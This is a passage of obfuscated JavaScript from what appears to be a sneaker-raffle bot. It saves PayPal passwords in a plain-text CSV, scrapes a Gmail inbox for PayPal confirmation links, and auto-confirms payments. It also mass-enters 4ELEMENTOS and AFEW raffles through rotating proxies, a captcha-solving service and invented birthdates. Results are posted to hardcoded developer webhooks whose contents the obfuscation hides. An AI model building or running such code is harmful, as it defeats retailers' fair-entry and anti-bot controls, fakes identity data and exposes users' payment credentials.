        console['log']('\x0a(' + _0x3f4d33['length'] + ')\x20' + _0x3dfcf2['cyan']('Add\x20a\x20new\x20account'));
        let _0x99fad2 = await _0x5addda['get']('Option');
        if (_0x99fad2['Option'] < _0x3f4d33['length'])
            return _0x3f4d33[_0x99fad2['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x76c469 = {}, _0x5f42cf = await _0x5addda['get']('Email');
        _0x76c469['Email'] = _0x5f42cf['Email'];
        var _0x184bb7 = Math['round'](Math['random']() * (_0x8b4b15['length'] - 0x1));
        _0x76c469['Proxy'] = _0x8b4b15[_0x184bb7], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x410873 = await _0x5addda['get']('Password');
        return _0x76c469['Password'] = _0x410873['Password'], _0x223df9['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x76c469['Email'] + ',' + _0x76c469['Password'] + ',' + _0x76c469['Proxy']), _0x76c469;
    }
    let _0x4cc04c = await _0x383778();
    var _0x232581 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x291ff0 = await _0x5addda['get']('Amount'), _0x39112f = _0x291ff0['Amount'];
    async function _0x2583c9() {
        let _0x48e29d = 0x0;
        var _0x21de33 = new _0x2fa2c3({
            'user': _0x4ae33b['masterMail'],
            'password': _0x4ae33b['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x35d41b(_0x1cb49c) {
            _0x21de33['openBox']('INBOX', ![], _0x1cb49c);
        }
        _0x21de33['once']('ready', function () {
            _0x35d41b(function (_0x31afcb, _0x55d395) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x31afcb)
                    throw _0x31afcb;
                _0x21de33['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x3f97c5, _0x31b651) {
                    if (!_0x31b651 || !_0x31b651['length'])
                        console['log'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20No\x20mails\x20found'), _0x21de33['end']();
                    else {
                        _0x31b651 = _0x31b651['slice'](0x0, _0x39112f);
                        var _0x512c95 = _0x21de33['seq']['fetch'](_0x31b651, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x512c95['on']('message', function (_0x362bf9, _0x3d5c7f) {
                            var _0x7c1725 = '(#' + _0x3d5c7f + ')\x20';
                            _0x362bf9['on']('body', function (_0x595993, _0x41994a) {
                                _0x44103a(_0x595993, (_0x4bd292, _0x56a71d) => {
                                    if (_0x56a71d['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x56a71d['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x56a71d['text']['split']('[')[0x2];
                                        var _0x184273 = mes['split'](']')[0x0];
                                        _0x232581['push'](_0x184273);
                                    }
                                });
                            }), _0x362bf9['once']('end', function () {
                                _0x48e29d++;
                            });
                        }), _0x512c95['once']('error', function (_0x1b1f7c) {
                            console['log']('Fetch\x20error:\x20' + _0x1b1f7c);
                        }), _0x512c95['once']('end', function () {
                            _0x21de33['end']();
                        });
                    }
                });
            });
        }), _0x21de33['once']('error', function (_0x333f2d) {
            console['log'](_0x3dfcf2['red'](_0x333f2d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x21de33['once']('end', async function () {
        }), _0x21de33['connect']();
    }
    try {
        _0x2583c9(), await _0x41ed31(0xfa0), console['log']('Found\x20' + _0x232581['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x41ed31(0xfa0);
    }
    var _0x183869;
    _0x445891('' + _0x294262);
    var _0x3a096e = _0x4cc04c['Proxy']['split'](':'), _0xe27c00;
    try {
        _0xe27c00 = await _0x23e690['launch']({
            'userDataDir': 'sessions/' + _0x4cc04c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3a096e[0x0] + ':' + _0x3a096e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0xe27c00 = await _0x23e690['launch']({
            'userDataDir': 'sessions/' + _0x4cc04c['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3a096e[0x0] + ':' + _0x3a096e[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Getting\x20Session');
        const _0x246306 = await _0xe27c00['newPage']();
        await _0x246306['authenticate']({
            'username': '' + _0x3a096e[0x2],
            'password': '' + _0x3a096e[0x3]
        }), await _0x246306['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x246306['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x246306['waitForSelector']('#email');
            let _0x4238da = await _0x246306['$eval']('#email', _0xdd2737 => _0xdd2737['getAttribute']('value'));
            if (_0x4238da == '') {
                await _0x246306['type']('#email', _0x4cc04c['Email']), await _0x41ed31(0x1d3);
                let _0x38bc3d = await _0x246306['$']('#splitPassword');
                _0x38bc3d && (await _0x246306['click']('#btnNext'), await _0x41ed31(0xa28)), await _0x246306['type']('#password', _0x4cc04c['Password']), await _0x41ed31(0x35c), await _0x246306['click']('#btnLogin');
            } else
                await _0x246306['type']('#password', _0x4cc04c['Password']), await _0x41ed31(0x35c), await _0x246306['click']('#btnLogin');
            await _0x246306['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Successfully\x20logged\x20in'), await _0x41ed31(0x2710);
        } catch (_0x4fd5f1) {
            throw new Error('Login\x20session\x20expired\x20' + _0x4fd5f1);
        }
        for (var _0x53ff7c = 0x0; _0x53ff7c < _0x232581['length']; _0x53ff7c++) {
            console['log'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Task\x20' + (_0x53ff7c + 0x1) + '\x20:\x20Starting\x20Verification'), _0x445891(_0x294262 + '\x20Task\x20' + (_0x53ff7c + 0x1) + '\x20/\x20' + _0x232581['length']);
            const _0x55c006 = await _0xe27c00['newPage']();
            await _0x55c006['goto']('' + _0x232581[_0x53ff7c], { 'waitUntil': 'networkidle2' }), await _0x41ed31(0xbb8);
            try {
                const _0x2d0c05 = await _0x55c006['$']('#challenge-heading');
                _0x2d0c05 && (console['log'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Task\x20' + (_0x53ff7c + 0x1) + '\x20:\x20' + _0x3dfcf2['yellow']('2FA\x20Required')), await _0x55c006['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x41ed31(0x9c40), await _0x55c006['waitForSelector']('#payment-submit-btn'), await _0x55c006['$eval']('#payment-submit-btn', _0x540b69 => _0x540b69['click']()), await _0x55c006['click']('#payment-submit-btn');
                try {
                    await _0x55c006['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x41ed31(0x5dc), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Task\x20' + (_0x53ff7c + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x45bcdd) {
                    _0x288e5d = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x45bcdd['message']);
                } finally {
                    if (_0x288e5d == 'yes' && _0x1b406a != 0x2) {
                        console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x294262['name'] + ']\x20Task\x20' + (_0x53ff7c + 0x1) + '\x20:\x20Retrying\x20(' + _0x1b406a + '\x20/\x205)')), _0x53ff7c = _0x53ff7c - 0x1, _0x1b406a = _0x1b406a + 0x1;
                        continue;
                    }
                    _0x288e5d == 'yes' && _0x1b406a >= 0x2 && (_0x2504ad(csv[_0x53ff7c], _0x294262), _0x288e5d = 'no', _0x1b406a = 0x0), await _0x55c006['close'](), await _0x41ed31(0x4650);
                }
            } catch (_0x1c17b5) {
                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x294262 + ']\x20Task\x20' + (_0x53ff7c + 0x1) + '\x20:\x20' + _0x1c17b5));
            }
        }
    } catch (_0x5c842a) {
        console['log'](_0x3dfcf2['red']('' + _0x5c842a));
    } finally {
        await _0xe27c00['close']();
    }
}
const _0x372ea7 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0x42e806, _0x8f06dc, _0x557051) {
                _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4ae33b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x252b18 = 0x0; _0x252b18 < _0x8f06dc['length']; _0x252b18++) {
                    if (_0x55acf5 != 'yes')
                        var _0x55acf5 = '', _0x582fba = 0x0;
                    var _0x25c593;
                    try {
                        await _0x101e1b(_0x8f06dc, _0x252b18);
                    } catch {
                        _0x55acf5 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x445891(_0x42e806['name'] + '\x20Task\x20' + (_0x252b18 + 0x1) + '\x20/\x20' + _0x8f06dc['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                    var _0x40adab = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x162cb1 = Math['round'](Math['random']() * (_0x40adab['length'] - 0x1));
                    _0x8f06dc[_0x252b18]['Size'] == 'RANDOM' && (_0x8f06dc[_0x252b18]['Size'] = _0x40adab[_0x162cb1]);
                    var _0xdbbd6d = Math['round'](Math['random']() * (_0x557051['length'] - 0x1)), _0x5ad074 = _0x557051[_0xdbbd6d]['split'](':'), _0x2488f0;
                    try {
                        _0x2488f0 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5ad074[0x0] + ':' + _0x5ad074[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2488f0 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5ad074[0x0] + ':' + _0x5ad074[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x30d010 = await _0x2488f0['newPage']();
                        await _0x30d010['authenticate']({
                            'username': '' + _0x5ad074[0x2],
                            'password': '' + _0x5ad074[0x3]
                        }), await _0x30d010['setRequestInterception'](!![]), _0x30d010['on']('request', _0x575691 => {
                            _0x575691['resourceType']() === 'image' || _0x575691['resourceType']() === 'font' || _0x575691['resourceType']() === 'media' ? _0x575691['abort']() : _0x575691['continue']();
                        }), await _0x30d010['goto'](_0x8f06dc[_0x252b18]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x41ed31(0x3e8), await _0x30d010['waitForSelector']('#accept-all-gdpr'), await _0x30d010['click']('#accept-all-gdpr'), await _0x30d010['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x41ed31(0xbb8);
                        let _0x4a76ae = await _0x30d010['$$']('button');
                        for (button of _0x4a76ae) {
                            let _0xde17fd = await _0x30d010['evaluate'](_0x5eddb0 => _0x5eddb0['innerHTML'], button);
                            if (_0xde17fd['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x41ed31(0x1388), await _0x30d010['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x41ed31(0x3e8);
                        let _0x48dff1 = await _0x30d010['$$']('input[name=\x22email\x22]');
                        await _0x48dff1[0x1]['click'](), await _0x41ed31(0x12c), await _0x30d010['keyboard']['type'](_0x8f06dc[_0x252b18]['Email']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Nombre\x22]', _0x8f06dc[_0x252b18]['FirstName'] + '\x20' + _0x8f06dc[_0x252b18]['LastName']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Direccion\x22]', _0x8f06dc[_0x252b18]['Address1'] + '\x20' + _0x8f06dc[_0x252b18]['HouseNumber'] + '\x20' + _0x8f06dc[_0x252b18]['Address2']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Ciudad\x22]', _0x8f06dc[_0x252b18]['City']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Provincia\x22]', _0x8f06dc[_0x252b18]['State']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22CP\x22]', _0x8f06dc[_0x252b18]['Zip']), await _0x41ed31(0x1c2), await _0x30d010['select']('select[name=\x22Pais\x22]', _0x8f06dc[_0x252b18]['Country']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Telefono\x22]', _0x8f06dc[_0x252b18]['Phone']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22cumple\x22]', _0x120d6e(0x1, 0x14) + '-' + _0x120d6e(0x1, 0xb) + '-' + _0x120d6e(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Instagram\x22]', _0x8f06dc[_0x252b18]['Follower']), await _0x41ed31(0x1c2), await _0x30d010['type']('input[name=\x22Talla\x22]', _0x8f06dc[_0x252b18]['Size']), await _0x41ed31(0x1f4), await _0x30d010['click']('#sexo_hombre'), await _0x41ed31(0x1f4), await _0x30d010['click']('#idioma_ingles'), await _0x41ed31(0x1f4), await _0x30d010['click']('#privacidad_si'), await _0x41ed31(0x1f4), await _0x30d010['click']('#acepta_suscripcion_si'), await _0x41ed31(0x1f4), console['log'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x3d3723 = await _0x30d010['$$']('button');
                        for (button of _0x3d3723) {
                            let _0x14c5a7 = await _0x30d010['evaluate'](_0x4451f8 => _0x4451f8['innerHTML'], button);
                            if (_0x14c5a7['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x41ed31(0x1388), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x55acf5 = '';
                        var _0x4d05e1 = await _0x559dec(_0x8f06dc[_0x252b18], _0x42e806, 'dev', ![]), _0x427cd9 = await _0x559dec(_0x8f06dc[_0x252b18], _0x42e806, 'pub', ![]);
                        const _0x4a508c = {
                            'succesDEVMSG': { 'embeds': [_0x4d05e1] },
                            'succesPUBMSG': { 'embeds': [_0x427cd9] }
                        };
                        try {
                            _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x4a508c['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x4a508c['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x4a508c['succesPUBMSG']);
                        } catch (_0xedcadc) {
                            console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xedcadc));
                        }
                    } catch (_0x4a616f) {
                        console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20' + _0x4a616f)), _0x25c593 = '' + _0x4a616f;
                        var _0x2d4a99 = await _0x559dec(_0x8f06dc[_0x252b18], _0x42e806, 'dev', !![], _0x25c593), _0x4d05e1 = await _0x559dec(_0x8f06dc[_0x252b18], _0x42e806, 'dev', ![]), _0x427cd9 = await _0x559dec(_0x8f06dc[_0x252b18], _0x42e806, 'pub', ![]);
                        const _0x12eb64 = {
                            'succesDEVMSG': { 'embeds': [_0x4d05e1] },
                            'succesPUBMSG': { 'embeds': [_0x427cd9] }
                        };
                        _0x12eb64['errorDEV'] = { 'embeds': [_0x2d4a99] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x12eb64['errorDEV']), await _0x48936e(_0x36657d, _0x12eb64['errorDEV']), _0x4a616f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x55acf5 = 'yes');
                    } finally {
                        _0x2488f0['close']();
                        if (_0x55acf5 == 'yes' && _0x582fba != 0x5 && _0x25c593 != 'Size\x20Not\x20Found') {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Task\x20' + (_0x252b18 + 0x1) + '\x20:\x20Retrying\x20(' + _0x582fba + '\x20/\x205)\x20')), _0x252b18 = _0x252b18 - 0x1, _0x582fba = _0x582fba + 0x1;
                            continue;
                        }
                        _0x55acf5 == 'yes' && _0x582fba >= 0x5 && (_0x2504ad(_0x8f06dc[_0x252b18], _0x42e806), _0x55acf5 = 'no', _0x582fba = 0x0), console['log'](_0x82e5a5() + '\x20[' + _0x42e806['name'] + ']\x20Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x34d987, _0x2bf4cc, _0x536ce1) {
                for (var _0x8d964c = 0x0; _0x8d964c < _0x2bf4cc['length']; _0x8d964c++) {
                    _0x4ae33b['AfewDelay'] = _0x4ae33b['delay'];
                    var _0x45127e;
                    if (_0x3fb761 != 'yes')
                        var _0x3fb761 = '', _0x18ffe2 = 0x0;
                    var _0x351cdf = _0x2bf4cc[_0x8d964c]['Url'], _0x4322f1 = _0x2bf4cc[_0x8d964c];
                    _0x445891(_0x34d987['name'] + '\x20Task\x20' + (_0x8d964c + 0x1) + '\x20/\x20' + _0x2bf4cc['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                    try {
                        await _0x101e1b(_0x2bf4cc, _0x8d964c);
                    } catch {
                        _0x3fb761 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x100dec(_0x2d8d2a) {
                        const _0x5341b9 = _0x223df9['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5d1d3d = _0x57f277['parse'](_0x5341b9, { 'header': !![] })['data'];
                        let _0x259124 = ![];
                        for (var _0x24d25e of _0x5d1d3d) {
                            if (_0x24d25e['Url'] == _0x2d8d2a['Url'] && _0x24d25e['Email'] == _0x2d8d2a['Email']) {
                                _0x259124 = !![];
                                break;
                            }
                        }
                        return _0x259124;
                    }
                    if (await _0x100dec(_0x2bf4cc[_0x8d964c]) == !![]) {
                        console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x171f2e = await _0x559dec(_0x2bf4cc[_0x8d964c], _0x34d987, 'dev', ![]), _0x43c6d9 = await _0x559dec(_0x2bf4cc[_0x8d964c], _0x34d987, 'pub', ![]);
                    const _0x40235f = {
                        'succesDEVMSG': { 'embeds': [_0x171f2e] },
                        'succesPUBMSG': { 'embeds': [_0x43c6d9] }
                    };
                    if (_0x2bf4cc[_0x8d964c]['Email'] == '' || _0x2bf4cc[_0x8d964c]['FirstName'] == '' || _0x2bf4cc[_0x8d964c]['LastName'] == '' || _0x2bf4cc[_0x8d964c]['Country'] == '' || _0x2bf4cc[_0x8d964c]['Size'] == '' || _0x2bf4cc[_0x8d964c]['Address1'] == '' || _0x2bf4cc[_0x8d964c]['Zip'] == '') {
                        console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x2bf4cc[_0x8d964c]['Country']['length'] == 0x2 && (_0x2bf4cc[_0x8d964c]['Country'] = _0x2a0b61[_0x2bf4cc[_0x8d964c]['Country']]);
                    if (_0x4ae33b['useRandomProxy'] = ![])
                        var _0x4d2182 = _0x536ce1[_0x8d964c]['split'](':');
                    else
                        var _0x8c052a = Math['round'](Math['random']() * (_0x536ce1['length'] - 0x1)), _0x4d2182 = _0x536ce1[_0x8c052a]['split'](':');
                    var _0x2a52c5;
                    try {
                        _0x2a52c5 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4d2182[0x0] + ':' + _0x4d2182[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x2a52c5 = await _0x23e690['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4d2182[0x0] + ':' + _0x4d2182[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x2821d5 = JSON['parse'](_0x223df9['readFileSync']('sizes.json', 'utf-8')), _0x351cdf = _0x2bf4cc[_0x8d964c]['Url'], _0x3bb78d = _0x2bf4cc[_0x8d964c]['Size'], _0x4d037b;
                        async function _0x5698c5() {
                            var _0x31c746 = new _0x51e796['CookieJar']();
                            console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x26cc76;
                            let _0x5dcb94 = {
                                'method': 'GET',
                                'cookieJar': _0x31c746,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x4d2182[0x2] + ':' + _0x4d2182[0x3] + '@' + _0x4d2182[0x0] + ':' + _0x4d2182[0x1]
                            }, _0x18c14e = _0x351cdf['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2353a5 = _0x18c14e + '.json', _0x11bfea = await _0x48af5a(_0x2353a5);
                            console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0xa6ffa7 = _0x11bfea['data']['product']['variants'];
                            if (_0x3bb78d != 'RANDOM') {
                                if (_0xa6ffa7[0x1]['option1']['includes']('W')) {
                                    const _0x1fdbbb = _0x2821d5['women']['find'](_0x502720 => _0x502720['EUsize'] === _0x3bb78d);
                                    _0x1fdbbb && (_0x3bb78d = _0x1fdbbb['size']);
                                } else {
                                    if (_0xa6ffa7[0x1]['option1']['includes']('Y')) {
                                        const _0x4f0e4e = _0x2821d5['men']['find'](_0x588e2a => _0x588e2a['EUsize'] === _0x3bb78d);
                                        _0x4f0e4e && (_0x3bb78d = _0x4f0e4e['size'] + 'Y');
                                    } else {
                                        const _0x3d821b = _0x2821d5['men']['find'](_0x4d44ed => _0x4d44ed['EUsize'] === _0x3bb78d);
                                        _0x3d821b && (_0x3bb78d = _0x3d821b['size']);
                                    }
                                }
                                for (var _0x27be92 of _0xa6ffa7) {
                                    _0x27be92['option1'] == _0x3bb78d && (_0x26cc76 = _0x27be92['id']);
                                }
                            } else {
                                var _0x436635 = Math['round'](Math['random']() * (_0xa6ffa7['length'] - 0x1));
                                _0x26cc76 = _0xa6ffa7[_0x436635]['id'];
                            }
                            console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x48af5a('https://raffles.afew-store.com/cart/' + _0x26cc76 + ':1'), _0x4d037b = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x5698c5();
                        } catch (_0x4e5eb7) {
                            if (_0x4e5eb7['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x4e5eb7);
                        }
                        const _0x252d06 = await _0x2a52c5['newPage']();
                        await _0x252d06['setDefaultNavigationTimeout'](0x1d4c0), await _0x252d06['authenticate']({
                            'username': '' + _0x4d2182[0x2],
                            'password': '' + _0x4d2182[0x3]
                        }), await _0x252d06['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x252d06['setRequestInterception'](!![]), _0x252d06['on']('request', _0x4134f9 => {
                            _0x4134f9['resourceType']() === 'image' || _0x4134f9['resourceType']() === 'font' || _0x4134f9['resourceType']() === 'media' ? _0x4134f9['abort']() : _0x4134f9['continue']();
                        });
                        try {
                            await _0x252d06['goto'](_0x4d037b, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x82e5a5() + '\x20[' + _0x34d987['name'] + ']\x20Task\x20' + (_0x8d964c + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x252d06['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x252d06['type']('#checkout_email', '' + _0x2bf4cc[_0x8d964c]['Email']), await _0x41ed31(0x320), await _0x252d06['type']('#checkout_attributes_instagram', '' + _0x2bf4cc[_0x8d964c]['Follower']), await _0x41ed31(0x320), await _0x252d06['select']('#checkout_shipping_address_country', '' + _0x2bf4cc[_0x8d964c]['Country']), await _0x252d06['waitForTimeout'](0x258), await _0x252d06['type']('#checkout_shipping_address_first_name', '' + _0x2bf4cc[_0x8d964c]['FirstName']), await _0x252d06['waitForTimeout'](0x320), await _0x252d06['type']('#checkout_shipping_address_last_name', '' + _0x2bf4cc[_0x8d964c]['LastName']), await _0x252d06['waitForTimeout'](0x2bc), await _0x252d06['type']('#checkout_shipping_address_address1', _0x2bf4cc[_0x8d964c]['Address1'] + '\x20' + _0x2bf4cc[_0x8d964c]['HouseNumber']), await _0x252d06['waitForTimeout'](0x2bc), await _0x252d06['type']('#checkout_shipping_address_address2', '' + _0x2bf4cc[_0x8d964c]['Address2']), await _0x252d06['waitForTimeout'](0x2bc), await _0x252d06['type']('#checkout_shipping_address_zip', '' + _0x2bf4cc[_0x8d964c]['Zip']), await _0x252d06['waitForTimeout'](0x2bc), await _0x252d06['type']('#checkout_shipping_address_city', '' + 